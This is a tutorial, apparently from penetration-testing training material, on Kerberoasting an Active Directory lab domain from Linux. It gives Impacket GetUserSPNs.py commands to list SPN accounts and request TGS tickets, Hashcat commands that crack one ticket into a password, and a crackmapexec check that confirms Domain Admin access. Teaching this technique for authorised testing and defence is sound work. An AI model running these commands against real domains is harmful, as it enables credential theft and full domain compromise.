# Kerberoasting from Linux

Kerberoasting is a lateral movement and privilege escalation technique that targets accounts with [Service Principal Names (SPNs)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) set in Active Directory. Any domain user can request a Kerberos ticket for any service account in the same domain. The resulting TGS ticket is encrypted with the service account's NTLM hash, which can then be cracked offline to recover the cleartext password.

***

## How It Works

When a user requests access to a service, the Domain Controller issues a TGS ticket encrypted with the service account's NTLM hash. An attacker with any valid domain user account can request this ticket for any SPN account without triggering an authentication failure, making this a low-noise technique. Cracking the ticket offline with a tool like [Hashcat](https://hashcat.net/hashcat/) does not generate any domain events after the initial ticket request.

Service accounts are frequently over-privileged. It is common to find SPN accounts that are members of Domain Admins, either directly or through nested group membership. If the password is weak or reused, cracking one ticket can result in immediate Domain Admin access. Even cracking a low-privilege SPN account is useful since it may grant local admin rights across multiple servers if the service account was deployed broadly.

***

## When Kerberoasting Applies

You can perform the attack from any of these positions:

- A non-domain joined Linux host with valid domain credentials
- A domain-joined Linux host as root after retrieving the keytab file
- A domain-joined Windows host running in the context of a domain user
- A non-domain joined Windows host using `runas /netonly`
- As SYSTEM on a domain-joined Windows host

***

## Kerberoasting with GetUserSPNs.py

[Impacket's GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) is the standard tool for performing Kerberoasting from Linux. It only requires cleartext credentials or an NTLM hash for any domain user account, plus the IP address of a Domain Controller.

### Installing Impacket

```bash
sudo python3 -m pip install .
```

### List All SPN Accounts

This returns all accounts with an SPN set, their group memberships, and password metadata. Pay close attention to any accounts in privileged groups:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Example output:

```
ServicePrincipalName                           Name               MemberOf
---------------------------------------------  -----------------  ---------------------------------------------------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,...
```

Three accounts here (`BACKUPAGENT`, `SOLARWINDSMONITOR`, `sqldev`) are Domain Admins. Cracking any one of these tickets would result in full domain compromise.

### Request All TGS Tickets

Add the `-request` flag to pull TGS tickets for all SPN accounts. The hashes are output in a format ready for Hashcat or John the Ripper:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

### Request a Single TGS Ticket

Target a specific account to avoid unnecessary noise and keep output clean:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

### Save the Ticket to a File

Always write the output to a file for offline cracking. This allows you to transfer the hash to a dedicated GPU cracking rig if needed:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

***

## Cracking the Ticket with Hashcat

TGS tickets use Hashcat mode `13100` (`Kerberos 5, etype 23, TGS-REP`). Note that TGS tickets are slower to crack than NTLM hashes, so weak or common passwords are a prerequisite for success in a realistic time frame:

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

Successful crack output:

```
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$...<hash>...:database!

Status......: Cracked
Time Started: Tue Feb 15 17:45:29 2022 (10 secs)
Speed.......: 821.3 kH/s
Progress....: 8765440/14344386 (61.11%)
```

The `sqldev` account's password is `database!`.

***

## Confirming Access

Verify the cracked credentials authenticate successfully against the Domain Controller. A `(Pwn3d!)` tag confirms local admin or Domain Admin rights:

```bash
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```
